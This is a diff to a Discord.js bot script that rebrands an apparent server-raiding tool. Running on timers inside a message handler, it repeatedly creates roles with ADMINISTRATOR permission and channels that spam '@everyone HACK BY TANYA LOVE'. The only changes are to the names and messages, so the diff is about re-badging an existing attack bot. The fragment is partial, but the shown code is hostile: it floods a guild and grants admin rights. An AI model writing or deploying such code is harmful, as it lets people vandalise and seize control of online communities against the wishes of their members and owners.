@@ -39,7 +39,7 @@ client.on('message', message => {
      
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED",
+                name: "TANYALOVE",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
@@ -54,8 +54,8 @@ client.on('message', message => {
         setTimeout(function() {
             setInterval(() => {
               
-                message.guild.createChannel('HACKED BY BLACK JACK', 'text').then(channel => { 
-                channel.send('@everyone HACK BY BLACK JACK :joy: :joy: :joy:')
+                message.guild.createChannel('HACKED BY TANYA LOVE', 'text').then(channel => { 
+                channel.send('@everyone HACK BY TANYA LOVE :joy: :joy: :joy:')
                
                 })
             }
